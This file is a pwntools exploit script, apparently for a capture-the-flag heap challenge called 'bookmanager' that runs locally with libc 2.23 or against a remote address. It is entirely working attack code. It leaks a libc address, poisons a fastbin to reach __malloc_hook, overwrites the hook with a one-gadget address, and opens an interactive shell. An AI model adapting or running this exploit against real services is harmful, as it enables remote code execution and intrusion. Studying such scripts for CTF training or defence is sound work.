
from pwn import *

debug=1

context.log_level='debug'

if debug:
    p=process('./bookmanager',env={'LD_PRELOAD':'./libc-2.23.so'})
    gdb.attach(p)
else:
    p=remote('47.112.115.30', 13337)

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)

def sl(x):
    p.sendline(x)


def add_chapter(name):
    sl('1')
    ru('Chapter name:')
    sl(name)
    ru('Your choice:')

def add_section(cn,name):
    sl('2')
    ru('Which chapter do you want to add into:')
    sl(cn)
    heap = int(ru('\n')[2:],16)
    ru('Section name:')
    sl(name)
    ru('Your choice:')
    return heap

def add_text(sn,sz,content):
    sl('3')
    ru('Which section do you want to add into:')
    sl(sn)
    ru('How many chapters you want to write:')
    sl(str(sz))
    ru('Text:')
    se(content)
    ru('Your choice:')

def remove_text(sn):
    sl('6')
    ru('Section name:')
    sl(sn)
    ru('Your choice:')

def show():
    sl('7')

ru('Name of the book you want to create:')
sl('aaaa')
ru('Your choice:')

add_chapter('c1')
heap = add_section('c1','s1')
add_text('s1',0xff,'a\n')

add_chapter('c2')
heap = add_section('c2','s2')
add_text('s2',0xff,'b\n')

remove_text('s1')
add_text('s1',0x98,'\n')

show()
ru('Text:')
libc = u64(ru('\n')[:-1]+'\0\0')
base = libc-0x3c4c78
ru('Your choice:')

remove_text('s2')
add_text('s2',0x68,'c\n')

remove_text('s2')

malloc_hook = base+0x3c4b10

sl('8')
ru('What to update?(Chapter/Section/Text):')
sl('Text')
ru('Section name:')
sl('s1')
ru('New Text:')
se('a'*0x98+p64(0x71)+p64(malloc_hook-0x23)+'\n')
ru('Your choice:')

add_chapter('c3')
heap = add_section('c3','s3')
add_text('s3',0x68,'a\n')

remove_text('s1')
add_text('s1',0x68,'a\n')

sl('8')
ru('What to update?(Chapter/Section/Text):')
sl('Text')
ru('Section name:')
sl('s1')
ru('New Text:')
se('a'*11+p64(base+0x4526a)+p64(base+0x846D0))
ru('Your choice:')
sl('1')
print(hex(base))
p.interactive()
